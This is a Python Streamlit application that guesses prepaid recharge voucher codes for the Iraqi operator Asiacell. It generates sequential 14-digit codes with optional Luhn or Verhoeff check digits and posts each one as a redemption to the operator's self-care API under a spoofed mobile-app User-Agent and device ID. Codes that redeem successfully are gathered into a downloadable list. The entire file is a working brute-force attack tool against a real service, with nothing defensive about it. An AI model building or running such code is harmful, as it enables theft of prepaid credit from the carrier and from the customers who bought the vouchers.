# app.py - Streamlit Interface
import streamlit as st
import requests
import time
import threading
import random
import json
import csv
import hashlib
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional, List, Dict, Tuple
from dataclasses import dataclass, field
import pandas as pd
from io import StringIO

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class VoucherResult:
    code: str
    active: bool
    error_code: str
    message: str
    balance: Optional[float] = None
    expiry: Optional[str] = None
    redemption_time: Optional[str] = None
    response_time_ms: float = 0
    raw_response: Dict = field(default_factory=dict)

class AsiacellRechargeEngine:
    def __init__(
        self,
        msisdn: str,
        max_workers: int = 3,
        rate_limit: float = 20.0,
        timeout: int = 10,
        jwt_token: Optional[str] = None,
        device_id: Optional[str] = None
    ):
        self.msisdn = msisdn
        self.max_workers = max_workers
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.jwt_token = jwt_token
        self.device_id = device_id or self._generate_device_id()
        
        self.session = requests.Session()
        self.session.headers.update({
            "Host": "selfcare.asiacell.com",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Asiacell-App-Android/v7.6.2",
            "X-Device-ID": self.device_id,
            "Accept-Encoding": "gzip"
        })
        
        if jwt_token:
            self.session.headers.update({"Authorization": f"Bearer {jwt_token}"})
            
        self.results = []
        self.active_found = []
        self.error_counts = {
            "INVALID": 0,
            "USED": 0,
            "EXPIRED": 0,
            "FORMAT": 0,
            "RATE_LIMIT": 0
        }
        self.rate_limit_lock = threading.Lock()
        self.last_request_time = 0
        
    def _generate_device_id(self) -> str:
        import uuid
        return str(uuid.uuid4()).upper()
        
    def generate_codes_sequential(self, start: int, end: int) -> List[str]:
        return [f"{num:014d}" for num in range(start, end + 1)]
        
    def _generate_luhn_checksum(self, partial: str) -> str:
        def luhn_digit(number):
            total = 0
            reverse = number[::-1]
            for i, digit in enumerate(reverse):
                n = int(digit)
                if i % 2 == 0:
                    n *= 2
                    if n > 9:
                        n -= 9
                total += n
            return str((10 - (total % 10)) % 10)
        
        return luhn_digit(partial)
        
    def _generate_verhoeff_checksum(self, partial: str) -> str:
        d = [
            [0,1,2,3,4,5,6,7,8,9],
            [1,2,3,4,0,6,7,8,9,5],
            [2,3,4,0,1,7,8,9,5,6],
            [3,4,0,1,2,8,9,5,6,7],
            [4,0,1,2,3,9,5,6,7,8],
            [5,9,8,7,6,0,4,3,2,1],
            [6,5,9,8,7,1,0,4,3,2],
            [7,0,4,6,9,1,3,2,5,8],
            [8,7,6,5,9,3,2,1,0,4],
            [9,8,7,6,5,4,3,2,1,0]
        ]
        p = [
            [0,1,2,3,4,5,6,7,8,9],
            [1,5,7,6,2,8,3,0,9,4],
            [5,8,0,3,7,9,6,1,4,2],
            [8,9,1,6,0,4,3,5,2,7],
            [9,4,5,3,1,2,6,8,7,0],
            [4,2,8,6,5,7,3,9,0,1],
            [2,7,9,3,8,0,6,4,1,5],
            [7,0,4,6,9,1,3,2,5,8]
        ]
        inv = [0,4,3,2,1,5,6,7,8,9]
        
        c = 0
        reversed_partial = partial[::-1]
        for i, char in enumerate(reversed_partial):
            c = d[c][p[(i + 1) % 8][int(char)]]
        return str(inv[c])
        
    def generate_codes_with_checksum(
        self,
        prefix: str,
        start: int,
        end: int,
        checksum_type: str = "luhn"
    ) -> List[str]:
        codes = []
        prefix_len = len(prefix)
        remaining = 14 - prefix_len
        
        if checksum_type == "luhn":
            for num in range(start, end + 1):
                partial = f"{prefix}{num:0{remaining-1}d}"
                checksum = self._generate_luhn_checksum(partial)
                code = f"{partial}{checksum}"
                codes.append(code)
        elif checksum_type == "verhoeff":
            for num in range(start, end + 1):
                partial = f"{prefix}{num:0{remaining-1}d}"
                checksum = self._generate_verhoeff_checksum(partial)
                code = f"{partial}{checksum}"
                codes.append(code)
        else:
            for num in range(start, end + 1):
                code = f"{prefix}{num:0{remaining}d}"
                codes.append(code)
                
        return codes
        
    def validate_code_format(self, code: str) -> Tuple[bool, str]:
        if len(code) != 14:
            return False, "ERR_BAD_FORMAT"
        if not code.isdigit():
            return False, "ERR_BAD_FORMAT"
        return True, "OK"
        
    def test_code(self, code: str) -> VoucherResult:
        valid, error = self.validate_code_format(code)
        if not valid:
            return VoucherResult(
                code=code,
                active=False,
                error_code=error,
                message="Invalid format - must be 14 digits",
                response_time_ms=0
            )
            
        start_time = time.perf_counter()
        
        payload = {
            "msisdn": self.msisdn,
            "voucherCode": code,
            "channel": "MOBILE_APP"
        }
        
        try:
            with self.rate_limit_lock:
                now = time.time()
                if now - self.last_request_time < self.rate_limit:
                    sleep_time = self.rate_limit - (now - self.last_request_time)
                    time.sleep(sleep_time)
                self.last_request_time = time.time()
                
            response = self.session.post(
                "https://selfcare.asiacell.com/api/v1/recharge/submit",
                json=payload,
                timeout=self.timeout
            )
            
            elapsed = (time.perf_counter() - start_time) * 1000
            
            if response.status_code == 429:
                self.error_counts["RATE_LIMIT"] += 1
                return VoucherResult(
                    code=code,
                    active=False,
                    error_code="ERR_RATE_LIMIT",
                    message="Rate limit exceeded",
                    response_time_ms=elapsed
                )
                
            if response.status_code == 200:
                data = response.json()
                error_code = data.get("errorCode", "")
                message = data.get("message", "")
                
                if error_code == "ERR_INVALID_VOUCHER":
                    self.error_counts["INVALID"] += 1
                    return VoucherResult(
                        code=code,
                        active=False,
                        error_code=error_code,
                        message=message or "Invalid voucher",
                        response_time_ms=elapsed,
                        raw_response=data
                    )
                elif error_code == "ERR_ALREADY_REDEEMED":
                    self.error_counts["USED"] += 1
                    return VoucherResult(
                        code=code,
                        active=False,
                        error_code=error_code,
                        message=message or "Already redeemed",
                        redemption_time=data.get("redemptionTime"),
                        response_time_ms=elapsed,
                        raw_response=data
                    )
                elif error_code == "ERR_VOUCHER_EXPIRED":
                    self.error_counts["EXPIRED"] += 1
                    return VoucherResult(
                        code=code,
                        active=False,
                        error_code=error_code,
                        message=message or "Voucher expired",
                        expiry=data.get("expiry"),
                        response_time_ms=elapsed,
                        raw_response=data
                    )
                else:
                    return VoucherResult(
                        code=code,
                        active=True,
                        error_code="SUCCESS",
                        message=message or "Success",
                        balance=data.get("balance"),
                        expiry=data.get("expiry"),
                        response_time_ms=elapsed,
                        raw_response=data
                    )
            else:
                return VoucherResult(
                    code=code,
                    active=False,
                    error_code=f"HTTP_{response.status_code}",
                    message=f"HTTP {response.status_code}",
                    response_time_ms=elapsed,
                    raw_response={"status": response.status_code}
                )
                
        except requests.exceptions.Timeout:
            return VoucherResult(
                code=code,
                active=False,
                error_code="ERR_TIMEOUT",
                message="Request timeout",
                response_time_ms=self.timeout * 1000
            )
        except Exception as e:
            return VoucherResult(
                code=code,
                active=False,
                error_code="ERR_UNKNOWN",
                message=str(e)[:100],
                response_time_ms=0
            )
            
    def test_batch_parallel(
        self,
        codes: List[str],
        progress_callback=None,
        stop_on_find: bool = True
    ) -> List[VoucherResult]:
        results = []
        total = len(codes)
        tested = 0
        active_found = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {executor.submit(self.test_code, code): code for code in codes}
            
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                tested += 1
                
                if result.active:
                    active_found += 1
                    self.active_found.append(result)
                    
                if progress_callback:
                    progress_callback(tested, total, active_found, result)
                    
                if stop_on_find and active_found > 0:
                    for f in futures:
                        f.cancel()
                    break
                    
        elapsed = time.time() - start_time
        return results
        
    def analyze_results(self, results: List[VoucherResult]) -> Dict:
        total = len(results)
        active = [r for r in results if r.active]
        invalid = [r for r in results if r.error_code == "ERR_INVALID_VOUCHER"]
        used = [r for r in results if r.error_code == "ERR_ALREADY_REDEEMED"]
        expired = [r for r in results if r.error_code == "ERR_VOUCHER_EXPIRED"]
        
        return {
            "total": total,
            "active": len(active),
            "invalid": len(invalid),
            "used": len(used),
            "expired": len(expired),
            "rate_limited": self.error_counts["RATE_LIMIT"],
            "success_rate": len(active) / total if total else 0,
            "active_codes": active,
            "avg_response_ms": sum(r.response_time_ms for r in results) / total if total else 0
        }

# ==================== STREAMLIT UI ====================

st.set_page_config(
    page_title="Asiacell Recharge Engine",
    page_icon="🔦",
    layout="wide"
)

st.title("🔦 Asiacell Recharge Code Tester")
st.markdown("*The Black Lighthouse - Keeper's Engine*")

with st.sidebar:
    st.header("⚙️ Configuration")
    
    msisdn = st.text_input("Target MSISDN", "96477XXXXXXXX", help="Format: 96477XXXXXXXX")
    
    st.subheader("Code Generation")
    prefix = st.text_input("Prefix (optional)", "1212")
    start_num = st.number_input("Start Number", min_value=0, value=0)
    end_num = st.number_input("End Number", min_value=0, value=9999)
    count = st.number_input("Number of Codes", min_value=1, value=100, max_value=10000)
    
    checksum_type = st.selectbox(
        "Checksum Type",
        ["none", "luhn", "verhoeff"],
        help="Luhn and Verhoeff are common checksum algorithms used in telecom vouchers"
    )
    
    st.subheader("Testing Configuration")
    workers = st.slider("Concurrent Workers", min_value=1, max_value=5, value=3, help="Max 5 due to rate limits")
    rate_limit = st.slider("Delay Between Requests (seconds)", min_value=5.0, max_value=60.0, value=20.0)
    stop_on_find = st.checkbox("Stop on First Active Code", value=True)
    
    st.subheader("Authentication")
    jwt_token = st.text_input("JWT Token (optional)", type="password")
    device_id = st.text_input("Device ID (auto-generated if empty)")
    
    run_button = st.button("🚀 Run Test", type="primary")

# Main area
if run_button:
    if not msisdn or len(msisdn) < 10:
        st.error("Please enter a valid MSISDN")
        st.stop()
        
    engine = AsiacellRechargeEngine(
        msisdn=msisdn,
        max_workers=workers,
        rate_limit=rate_limit,
        jwt_token=jwt_token if jwt_token else None,
        device_id=device_id if device_id else None
    )
    
    st.info(f"Generating codes with prefix: {prefix}, checksum: {checksum_type}")
    
    with st.spinner("Generating codes..."):
        if checksum_type != "none":
            codes = engine.generate_codes_with_checksum(
                prefix=prefix,
                start=start_num,
                end=start_num + count - 1,
                checksum_type=checksum_type
            )
        else:
            codes = engine.generate_codes_sequential(start_num, start_num + count - 1)
            
    st.success(f"Generated {len(codes)} codes")
    
    progress_bar = st.progress(0)
    status_text = st.empty()
    results_container = st.container()
    
    results = []
    active_found = []
    
    def update_progress(tested, total, active_count, result):
        progress_bar.progress(tested / total)
        status_text.text(f"Tested: {tested}/{total} | Active: {active_count} | Last: {result.code} - {result.message}")
        if result.active:
            active_found.append(result)
    
    with st.spinner("Testing codes..."):
        results = engine.test_batch_parallel(
            codes,
            progress_callback=update_progress,
            stop_on_find=stop_on_find
        )
    
    analysis = engine.analyze_results(results)
    
    # Results display
    col1, col2, col3, col4, col5 = st.columns(5)
    with col1:
        st.metric("Total Tested", analysis["total"])
    with col2:
        st.metric("✅ Active", analysis["active"], delta="Found!" if analysis["active"] > 0 else None)
    with col3:
        st.metric("❌ Invalid", analysis["invalid"])
    with col4:
        st.metric("🔄 Used", analysis["used"])
    with col5:
        st.metric("⏰ Expired", analysis["expired"])
    
    if analysis["active_codes"]:
        st.success(f"🎯 Found {len(analysis['active_codes'])} active codes!")
        
        active_df = pd.DataFrame([{
            "Code": r.code,
            "Balance": r.balance,
            "Expiry": r.expiry,
            "Message": r.message
        } for r in analysis["active_codes"]])
        
        st.dataframe(active_df, use_container_width=True)
        
        csv = active_df.to_csv(index=False)
        st.download_button(
            label="📥 Download Active Codes (CSV)",
            data=csv,
            file_name=f"active_codes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            mime="text/csv"
        )
    
    # Full results table
    with st.expander("📊 View All Results"):
        result_df = pd.DataFrame([{
            "Code": r.code,
            "Active": r.active,
            "Error": r.error_code,
            "Message": r.message,
            "Balance": r.balance,
            "Response (ms)": round(r.response_time_ms, 2)
        } for r in results])
        
        st.dataframe(result_df, use_container_width=True)
        
        csv_full = result_df.to_csv(index=False)
        st.download_button(
            label="📥 Download All Results (CSV)",
            data=csv_full,
            file_name=f"all_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv",
            mime="text/csv"
        )
    
    # Rate limit info
    st.info(f"⚠️ Rate limit: {rate_limit}s between requests | Workers: {workers} | Errors: {analysis['rate_limited']} rate-limited")

else:
    st.info("👆 Configure the settings and click 'Run Test' to start")
    
    st.markdown("""
    ### How It Works
    
    1. **Configuration**: Set your target MSISDN, code prefix, and range
    2. **Code Generation**: Creates 14-digit codes with optional Luhn/Verhoeff checksums
    3. **Testing**: Sends requests to `selfcare.asiacell.com/api/v1/recharge/submit`
    4. **Results**: Displays active, invalid, used, and expired codes
    
    ### Response Codes
    | Code | Meaning |
    |------|---------|
    | `ERR_INVALID_VOUCHER` | Code doesn't exist or is invalid |
    | `ERR_ALREADY_REDEEMED` | Code was already used |
    | `ERR_VOUCHER_EXPIRED` | Code has expired |
    | `ERR_RATE_LIMIT` | Too many requests |
    | `SUCCESS` | Active code found |
    
    ### Requirements
    - Valid MSISDN in Asiacell network
    - JWT token from mobile app (optional but recommended)
    - Rate limit: ~3 requests per minute per IP
    """)